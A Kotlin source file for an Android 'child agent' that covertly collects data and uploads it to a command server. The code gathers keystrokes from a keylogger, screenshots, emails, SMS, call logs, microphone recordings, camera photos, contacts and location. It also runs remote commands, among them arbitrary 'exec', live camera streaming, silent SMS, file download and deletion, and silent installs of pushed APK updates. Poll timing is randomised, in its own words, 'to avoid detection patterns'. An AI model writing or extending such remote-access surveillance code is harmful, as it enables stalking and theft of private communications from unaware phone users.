package com.divine.specter.child.sync

import android.content.Context
import android.os.BatteryManager
import android.os.Build
import android.os.PowerManager
import android.provider.Settings
import com.divine.specter.child.crypto.AesCrypto
import com.divine.specter.child.service.*
import kotlinx.coroutines.*
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.serialization.Serializable
import kotlinx.serialization.encodeToString
import kotlinx.serialization.json.Json
import java.io.BufferedReader
import java.io.InputStreamReader
import java.io.File
import java.net.HttpURLConnection
import java.net.URL
import kotlin.random.Random

/**
 * Child agent sync - connects to parent server.
 * Runs in background, polls for commands, reports data.
 */
class ChildSync(private val context: Context) {

    companion object {
        private const val BASE_POLL_INTERVAL = 30_000L  // 30 seconds base
        private const val BASE_SYNC_INTERVAL = 60_000L  // 1 minute base
        private const val MAX_RETRIES = 3
        private const val RETRY_DELAY = 5_000L    // 5 seconds
        private const val CONNECTION_TIMEOUT = 10_000  // 10 seconds
        private const val READ_TIMEOUT = 15_000        // 15 seconds
        private const val JITTER_PERCENT = 0.2    // ±20% jitter
    }

    // Adaptive polling intervals
    private var currentPollInterval = BASE_POLL_INTERVAL
    private var currentSyncInterval = BASE_SYNC_INTERVAL
    private val random = Random.Default

    // XOR encryption key (derived from device ID)
    private var encryptionKey: ByteArray? = null

    private val json = Json { ignoreUnknownKeys = true; encodeDefaults = true }
    private var pollJob: Job? = null
    private var syncJob: Job? = null

    // Camera streaming service
    private val cameraStreamService = CameraStreamService(context)

    // Config - baked in at APK generation or set manually
    var serverUrl: String = ""
    var deviceId: String = ""
    var deviceToken: String = ""

    private val _isConnected = MutableStateFlow(false)
    val isConnected: StateFlow<Boolean> = _isConnected

    // Callbacks for command execution
    var onLocate: (() -> Unit)? = null
    var onLock: (() -> Unit)? = null
    var onBlockApp: ((String) -> Unit)? = null
    var onUnblockApp: ((String) -> Unit)? = null
    var onExec: ((String) -> String)? = null

    // Data providers
    var getLocation: (() -> LocationData?)? = null
    var getNotifications: (() -> List<NotificationData>)? = null
    var getCurrentApp: (() -> String?)? = null

    @Serializable
    data class LocationData(val latitude: Double, val longitude: Double, val accuracy: Float)

    @Serializable
    data class NotificationData(
        val packageName: String, val appName: String,
        val title: String?, val text: String?, val timestamp: Long
    )

    @Serializable
    data class Keystroke(
        val text: String,
        val packageName: String,
        val timestamp: Long,
        val fieldType: String = "unknown"
    )

    @Serializable
    data class Screenshot(
        val timestamp: Long,
        val imageDataBase64: String,
        val width: Int,
        val height: Int
    )

    @Serializable
    data class EmailData(
        val account: String,
        val subject: String,
        val sender: String,
        val recipients: String,
        val body: String,
        val timestamp: Long,
        val hasAttachment: Boolean,
        val folder: String
    )

    @Serializable
    data class AudioRecording(
        val filename: String,
        val duration: Int,
        val timestamp: Long,
        val size: Long
    )

    @Serializable
    data class CameraCapture(
        val filename: String,
        val camera: String,
        val timestamp: Long,
        val size: Long
    )

    @Serializable
    data class SyncRequest(
        val location: LocationData? = null,
        val battery: Int? = null,
        val current_app: String? = null,
        val screen_on: Boolean? = null,
        val notifications: List<NotificationData>? = null,
        val device_info: DeviceInfoCollector.DeviceInfo? = null,
        val keystrokes: List<Keystroke>? = null,
        val screenshots: List<Screenshot>? = null,
        val emails: List<EmailData>? = null,
        val sms_messages: List<SmsCollectorService.SmsMessage>? = null,
        val call_logs: List<CallLogCollectorService.CallLogEntry>? = null,
        val audio_recordings: List<AudioRecording>? = null,
        val camera_captures: List<CameraCapture>? = null,
        val contacts: List<ContactMonitorService.ContactChange>? = null,
        val calendar_events: List<CalendarMonitorService.CalendarEvent>? = null,
        // New features
        val ip_location: IpLocationService.IpLocationData? = null,
        val connected_wifi: WifiMonitorService.ConnectedWifiData? = null,
        val nearby_wifi: List<WifiMonitorService.NearbyWifiData>? = null,
        val silent_sms_results: List<SilentSmsService.SilentSmsResult>? = null
    )

    @Serializable
    data class Command(val id: String, val action: String, val payload: String = "")

    @Serializable
    data class PollResponse(val commands: List<Command>, val server_time: String)

    @Serializable
    data class RegisterResponse(val device_id: String, val token: String, val server_time: String)

    // ============== Setup ==============

    suspend fun register(serverUrl: String, deviceName: String): Boolean {
        this.serverUrl = serverUrl
        // Use the stable ID stored by ConfigReceiver (UUID-based). Fall back to hardware IDs only
        // if prefs ID is missing (first-boot edge case), never use timestamp-based ID.
        val prefs = context.getSharedPreferences("specter_child_prefs", Context.MODE_PRIVATE)
        this.deviceId = prefs.getString("device_id", null)?.takeIf { it.isNotBlank() }
            ?: if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                try { Build.getSerial().take(16) } catch (e: SecurityException) {
                    Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID).take(16)
                }
            } else {
                @Suppress("DEPRECATION") Build.SERIAL.take(16)
            }.ifEmpty { "child_${java.util.UUID.randomUUID().toString().take(8)}" }

        // Registration is plain JSON — server has no key yet to decrypt with.
        // Encryption key is set AFTER registration succeeds.
        encryptionKey = null

        val body = json.encodeToString(mapOf(
            "device_id" to deviceId,
            "name" to deviceName,
            "model" to "${Build.MANUFACTURER} ${Build.MODEL}"
        ))

        return try {
            val response = post("$serverUrl/api/register", body)
            // Now that we have the token, derive the encryption key for subsequent calls
            encryptionKey = AesCrypto.sha256(deviceId)
            val reg = json.decodeFromString<RegisterResponse>(response)
            deviceToken = reg.token
            _isConnected.value = true
            true
        } catch (e: Exception) {
            _isConnected.value = false
            false
        }
    }

    // ============== Sync & Poll ==============

    fun startAll() {
        startSync()
        startPolling()
    }

    fun stopAll() {
        syncJob?.cancel()
        pollJob?.cancel()
    }

    private fun startSync() {
        syncJob = CoroutineScope(Dispatchers.IO).launch {
            while (isActive) {
                syncNow()
                val nextInterval = calculateAdaptiveInterval(currentSyncInterval)
                delay(nextInterval)
            }
        }
    }

    private fun startPolling() {
        pollJob = CoroutineScope(Dispatchers.IO).launch {
            while (isActive) {
                pollCommands()
                adjustPollRate()  // Adapt based on battery/charging
                val nextInterval = calculateAdaptiveInterval(currentPollInterval)
                delay(nextInterval)
            }
        }
    }

    /**
     * Calculate next interval with jitter to avoid detection patterns.
     * Adds ±20% randomness to base interval.
     */
    private fun calculateAdaptiveInterval(baseInterval: Long): Long {
        val jitter = (baseInterval * JITTER_PERCENT * random.nextDouble()).toLong()
        return baseInterval + (if (random.nextBoolean()) jitter else -jitter)
    }

    /**
     * Adjust polling rate based on battery level and charging state.
     * Fast when charging, slow when low battery, normal otherwise.
     */
    private fun adjustPollRate() {
        val batteryLevel = getBattery()
        val isCharging = isCharging()

        currentPollInterval = when {
            isCharging -> 15_000L              // Fast: 15s when charging
            batteryLevel < 15 -> 300_000L      // Slow: 5min when low battery
            batteryLevel < 30 -> 120_000L      // Medium: 2min when medium battery
            else -> BASE_POLL_INTERVAL         // Normal: 30s
        }
    }

    private fun isCharging(): Boolean {
        val bm = context.getSystemService(Context.BATTERY_SERVICE) as BatteryManager
        return bm.isCharging
    }

    suspend fun syncNow() {
        if (serverUrl.isEmpty()) return

        // Collect keystrokes
        val keystrokes = KeyloggerService.getAndClearKeystrokes().map { ks ->
            Keystroke(
                text = ks.text,
                packageName = ks.packageName,
                timestamp = ks.timestamp,
                fieldType = ks.fieldType
            )
        }

        // Collect screenshots
        val screenshots = ScreenCaptureService.getAndClearScreenshots().map { ss ->
            Screenshot(
                timestamp = ss.timestamp,
                imageDataBase64 = android.util.Base64.encodeToString(ss.imageData, android.util.Base64.NO_WRAP),
                width = ss.width,
                height = ss.height
            )
        }

        // Collect emails
        val emails = EmailCollectorService.getAndClearEmails().map { em ->
            EmailData(
                account = em.account,
                subject = em.subject,
                sender = em.sender,
                recipients = em.recipients,
                body = em.body,
                timestamp = em.timestamp,
                hasAttachment = em.hasAttachment,
                folder = em.folder
            )
        }

        // Collect SMS (direct pass, serializable)
        val smsMessages = SmsCollectorService.getAndClearMessages()

        // Collect call logs (direct pass, serializable)
        val callLogs = CallLogCollectorService.getAndClearCalls()

        // Collect audio recordings (convert File to filename + size)
        val audioRecordings = AudioRecorderService.getAndClearRecordings().map { audio ->
            AudioRecording(
                filename = audio.file.name,
                duration = audio.duration,
                timestamp = audio.timestamp,
                size = audio.file.length()
            )
        }

        // Collect camera captures (convert File to filename + size)
        val cameraCaptures = CameraCaptureService.getAndClearPhotos().map { photo ->
            CameraCapture(
                filename = photo.file.name,
                camera = photo.camera,
                timestamp = photo.timestamp,
                size = photo.file.length()
            )
        }

        // Collect contacts (direct pass, serializable)
        val contacts = ContactMonitorService.getAndClearChanges()

        // Collect calendar events (direct pass, serializable)
        val calendarEvents = CalendarMonitorService.getAndClearEvents()

        // Collect device info (once per sync)
        val deviceInfo = DeviceInfoCollector.collectDeviceInfo(context)

        // Collect IP geolocation (every sync)
        val ipLocation = IpLocationService.getIpLocation()

        // Collect WiFi data (every sync)
        val connectedWifi = WifiMonitorService.getConnectedWifi(context)
        val nearbyWifi = WifiMonitorService.scanNearbyNetworks(context)

        // Collect silent SMS results
        val silentSmsResults = SilentSmsService.getResults()

        val request = SyncRequest(
            location = getLocation?.invoke(),
            battery = getBattery(),
            current_app = getCurrentApp?.invoke(),
            screen_on = isScreenOn(),
            notifications = getNotifications?.invoke(),
            device_info = deviceInfo,
            keystrokes = if (keystrokes.isNotEmpty()) keystrokes else null,
            screenshots = if (screenshots.isNotEmpty()) screenshots else null,
            emails = if (emails.isNotEmpty()) emails else null,
            sms_messages = if (smsMessages.isNotEmpty()) smsMessages else null,
            call_logs = if (callLogs.isNotEmpty()) callLogs else null,
            audio_recordings = if (audioRecordings.isNotEmpty()) audioRecordings else null,
            camera_captures = if (cameraCaptures.isNotEmpty()) cameraCaptures else null,
            contacts = if (contacts.isNotEmpty()) contacts else null,
            calendar_events = if (calendarEvents.isNotEmpty()) calendarEvents else null,
            ip_location = ipLocation,
            connected_wifi = connectedWifi,
            nearby_wifi = if (nearbyWifi.isNotEmpty()) nearbyWifi else null,
            silent_sms_results = if (silentSmsResults.isNotEmpty()) silentSmsResults else null
        )

        try {
            postWithAuth("$serverUrl/api/sync", json.encodeToString(request))
            _isConnected.value = true
        } catch (e: Exception) {
            _isConnected.value = false
        }
    }

    suspend fun pollCommands() {
        if (serverUrl.isEmpty()) return

        try {
            val response = getWithAuth("$serverUrl/api/poll")
            val poll = json.decodeFromString<PollResponse>(response)
            _isConnected.value = true

            for (cmd in poll.commands) {
                executeCommand(cmd)
            }
        } catch (e: Exception) {
            _isConnected.value = false
        }
    }

    private suspend fun executeCommand(cmd: Command) {
        val result = try {
            when (cmd.action) {
                "locate" -> { onLocate?.invoke(); "Location requested" }
                "lock" -> { onLock?.invoke(); "Locked" }
                "block_app" -> { onBlockApp?.invoke(cmd.payload); "Blocked ${cmd.payload}" }
                "unblock_app" -> { onUnblockApp?.invoke(cmd.payload); "Unblocked ${cmd.payload}" }
                "exec" -> onExec?.invoke(cmd.payload) ?: "No executor"

                // Surveillance commands
                "record_audio" -> {
                    val duration = cmd.payload.toIntOrNull() ?: 30
                    AudioRecorderService.recordAudio(context, duration)
                    "Recording audio for ${duration}s"
                }
                "capture_photo" -> {
                    val camera = cmd.payload.ifEmpty { "back" }
                    CameraCaptureService.capturePhoto(context, camera)
                    "Captured photo from $camera camera"
                }
                "capture_screenshot" -> {
                    ScreenCaptureService.captureScreen(context)
                    "Screenshot captured"
                }
                "collect_emails" -> {
                    EmailCollectorService.collectNow(context)
                    "Emails collected"
                }
                "collect_sms" -> {
                    SmsCollectorService.collectNow(context)
                    "SMS collected"
                }
                "collect_calls" -> {
                    CallLogCollectorService.collectNow(context)
                    "Call logs collected"
                }
                "collect_contacts" -> {
                    ContactMonitorService.collectNow(context)
                    "Contacts collected"
                }
                "collect_calendar" -> {
                    CalendarMonitorService.collectNow(context)
                    "Calendar collected"
                }
                "start_keylogger" -> {
                    KeyloggerService.start(context)
                    "Keylogger started"
                }
                "stop_keylogger" -> {
                    KeyloggerService.stop(context)
                    "Keylogger stopped"
                }

                // Network surveillance commands
                "send_silent_sms" -> {
                    val parts = cmd.payload.split("|")
                    val phoneNumber = parts.getOrNull(0) ?: ""
                    val message = parts.getOrNull(1) ?: ""
                    val sent = SilentSmsService.sendSilentSms(context, phoneNumber, message)
                    if (sent) "Silent SMS sent to $phoneNumber" else "Failed to send SMS"
                }
                "scan_wifi" -> {
                    val networks = WifiMonitorService.scanNearbyNetworks(context)
                    "Found ${networks.size} WiFi networks"
                }
                "get_ip_location" -> {
                    val ipData = IpLocationService.getIpLocation()
                    if (ipData != null) "IP: ${ipData.ip}, ${ipData.city}, ${ipData.country}" else "Failed to get IP"
                }

                // Video streaming commands
                "start_camera_stream" -> {
                    val cameraId = cmd.payload.ifEmpty { "0" }
                    withContext(Dispatchers.Main) {
                        cameraStreamService.startStream(cameraId)
                    }
                    val url = cameraStreamService.streamUrl.value
                    "Camera stream started: $url"
                }
                "stop_camera_stream" -> {
                    cameraStreamService.stopStream()
                    "Camera stream stopped"
                }

                // File browser commands
                "list_directory" -> {
                    val path = cmd.payload.ifEmpty { "/sdcard" }
                    val dir = File(path)
                    if (dir.exists() && dir.isDirectory) {
                        val files = dir.listFiles()?.map { f ->
                            "${if (f.isDirectory) "D" else "F"}|${f.name}|${f.length()}|${f.lastModified()}"
                        }?.joinToString("\n") ?: ""
                        "OK\n$files"
                    } else {
                        "Error: Directory not found or not accessible"
                    }
                }
                "download_file" -> {
                    val path = cmd.payload
                    val file = File(path)
                    if (file.exists() && file.isFile) {
                        // Return base64 encoded file content for small files
                        if (file.length() < 5 * 1024 * 1024) { // 5MB limit
                            val bytes = file.readBytes()
                            val base64 = android.util.Base64.encodeToString(bytes, android.util.Base64.NO_WRAP)
                            "OK|${file.name}|$base64"
                        } else {
                            "Error: File too large (>5MB)"
                        }
                    } else {
                        "Error: File not found"
                    }
                }
                "search_files" -> {
                    // Payload format: query=X&paths=p1,p2&extensions=ext1,ext2
                    val params = cmd.payload.split("&").associate {
                        val (k, v) = it.split("=", limit = 2)
                        k to v
                    }
                    val query = params["query"] ?: "*"
                    val paths = params["paths"]?.split(",") ?: listOf("/sdcard")
                    val extensions = params["extensions"]?.split(",")?.filter { it.isNotEmpty() }

                    val results = mutableListOf<String>()
                    for (basePath in paths) {
                        val dir = File(basePath)
                        if (dir.exists()) {
                            dir.walkTopDown().take(500).forEach { f ->
                                if (f.isFile) {
                                    val matchesQuery = query == "*" || f.name.contains(query, ignoreCase = true)
                                    val matchesExt = extensions == null || extensions.any { f.name.endsWith(".$it", ignoreCase = true) }
                                    if (matchesQuery && matchesExt) {
                                        results.add("${f.absolutePath}|${f.length()}")
                                    }
                                }
                            }
                        }
                    }
                    "OK\n${results.take(100).joinToString("\n")}"
                }
                "get_storage_info" -> {
                    val stat = android.os.StatFs("/sdcard")
                    val total = stat.totalBytes
                    val free = stat.availableBytes
                    val used = total - free
                    "OK|$total|$used|$free"
                }
                "delete_file" -> {
                    val path = cmd.payload
                    val file = File(path)
                    if (file.exists()) {
                        if (file.delete()) {
                            "OK: Deleted $path"
                        } else {
                            "Error: Failed to delete"
                        }
                    } else {
                        "Error: File not found"
                    }
                }

                else -> "Unknown: ${cmd.action}"
            }
        } catch (e: Exception) {
            "Error: ${e.message}"
        }

        // Report result
        try {
            postWithAuth("$serverUrl/api/result", json.encodeToString(mapOf(
                "command_id" to cmd.id,
                "success" to !result.startsWith("Error"),
                "output" to result
            )))
        } catch (_: Exception) { }
    }

    // ============== Helpers ==============

    private fun getBattery(): Int {
        val bm = context.getSystemService(Context.BATTERY_SERVICE) as BatteryManager
        return bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
    }

    private fun isScreenOn(): Boolean {
        val pm = context.getSystemService(Context.POWER_SERVICE) as PowerManager
        return pm.isInteractive
    }

    private var consecutiveFailures = 0

    private suspend fun <T> withRetry(
        maxRetries: Int = MAX_RETRIES,
        block: suspend () -> T
    ): T {
        var lastException: Exception? = null
        repeat(maxRetries) { attempt ->
            try {
                val result = block()
                consecutiveFailures = 0
                return result
            } catch (e: Exception) {
                lastException = e
                if (attempt < maxRetries - 1) {
                    delay(RETRY_DELAY * (attempt + 1))  // Exponential backoff
                }
            }
        }
        consecutiveFailures++
        throw lastException ?: Exception("Unknown error after $maxRetries retries")
    }

    private suspend fun post(url: String, body: String): String = withContext(Dispatchers.IO) {
        withRetry {
            val conn = URL(url).openConnection() as HttpURLConnection
            conn.connectTimeout = CONNECTION_TIMEOUT
            conn.readTimeout = READ_TIMEOUT
            conn.requestMethod = "POST"
            conn.setRequestProperty("Content-Type", "application/octet-stream")
            conn.doOutput = true
            try {
                // XOR encrypt payload
                val encrypted = encryptionKey?.let {
                    AesCrypto.encrypt(body.toByteArray(), it)
                } ?: body.toByteArray()

                conn.outputStream.use { it.write(encrypted) }
                val response = BufferedReader(InputStreamReader(conn.inputStream)).use { it.readText() }

                // XOR decrypt response
                encryptionKey?.let {
                    AesCrypto.decryptString(response.toByteArray(), it)
                } ?: response
            } finally {
                conn.disconnect()
            }
        }
    }

    private suspend fun postWithAuth(url: String, body: String): String = withContext(Dispatchers.IO) {
        withRetry {
            val conn = URL(url).openConnection() as HttpURLConnection
            conn.connectTimeout = CONNECTION_TIMEOUT
            conn.readTimeout = READ_TIMEOUT
            conn.requestMethod = "POST"
            conn.setRequestProperty("Content-Type", "application/octet-stream")
            conn.setRequestProperty("X-Device-ID", deviceId)
            conn.setRequestProperty("X-Device-Token", deviceToken)
            conn.doOutput = true
            try {
                // XOR encrypt payload
                val encrypted = encryptionKey?.let {
                    AesCrypto.encrypt(body.toByteArray(), it)
                } ?: body.toByteArray()

                conn.outputStream.use { it.write(encrypted) }
                val response = conn.inputStream.readBytes()

                // XOR decrypt response
                val decrypted = encryptionKey?.let {
                    AesCrypto.decrypt(response, it)
                } ?: response

                String(decrypted)
            } finally {
                conn.disconnect()
            }
        }
    }

    private suspend fun getWithAuth(url: String): String = withContext(Dispatchers.IO) {
        withRetry {
            val conn = URL(url).openConnection() as HttpURLConnection
            conn.connectTimeout = CONNECTION_TIMEOUT
            conn.readTimeout = READ_TIMEOUT
            conn.setRequestProperty("X-Device-ID", deviceId)
            conn.setRequestProperty("X-Device-Token", deviceToken)
            try {
                val response = conn.inputStream.readBytes()

                // XOR decrypt response
                val decrypted = encryptionKey?.let {
                    AesCrypto.decrypt(response, it)
                } ?: response

                String(decrypted)
            } finally {
                conn.disconnect()
            }
        }
    }

    fun getConsecutiveFailures(): Int = consecutiveFailures

    /**
     * BINARY UPDATE: Check for and install APK updates from parent server
     */
    suspend fun checkForUpdates(currentVersion: Int): Boolean = withContext(Dispatchers.IO) {
        if (serverUrl.isEmpty()) return@withContext false

        try {
            val requestBody = json.encodeToString(mapOf("current_version" to currentVersion))
            val response = postWithAuth("$serverUrl/api/update", requestBody)

            val updateData = json.decodeFromString<Map<String, String>>(response)
            val apkDataBase64 = updateData["apk_data"] ?: return@withContext false
            val newVersion = updateData["version"]?.toIntOrNull() ?: return@withContext false

            // Decode and decrypt APK
            val encryptedApk = android.util.Base64.decode(apkDataBase64, android.util.Base64.NO_WRAP)
            val decryptedApk = encryptionKey?.let {
                AesCrypto.decrypt(encryptedApk, it)
            } ?: encryptedApk

            // Save to cache and install
            val apkFile = File(context.cacheDir, "update_v$newVersion.apk")
            apkFile.writeBytes(decryptedApk)

            installApk(apkFile)
            true
        } catch (e: Exception) {
            android.util.Log.e("ChildSync", "Update check failed: ${e.message}")
            false
        }
    }

    private fun installApk(apkFile: File) {
        try {
            val packageInstaller = context.packageManager.packageInstaller
            val params = android.content.pm.PackageInstaller.SessionParams(
                android.content.pm.PackageInstaller.SessionParams.MODE_FULL_INSTALL
            )

            val sessionId = packageInstaller.createSession(params)
            val session = packageInstaller.openSession(sessionId)

            session.openWrite("package", 0, -1).use { output: java.io.OutputStream ->
                apkFile.inputStream().use { input ->
                    input.copyTo(output)
                }
            }

            val intent = android.content.Intent(context, context.javaClass).apply {
                action = "com.divine.specter.child.INSTALL_COMPLETE"
            }
            val pendingIntent = android.app.PendingIntent.getBroadcast(
                context, 0, intent,
                android.app.PendingIntent.FLAG_UPDATE_CURRENT or android.app.PendingIntent.FLAG_IMMUTABLE
            )

            session.commit(pendingIntent.intentSender)
            session.close()
        } catch (e: Exception) {
            android.util.Log.e("ChildSync", "APK install failed: ${e.message}")
        }
    }
}
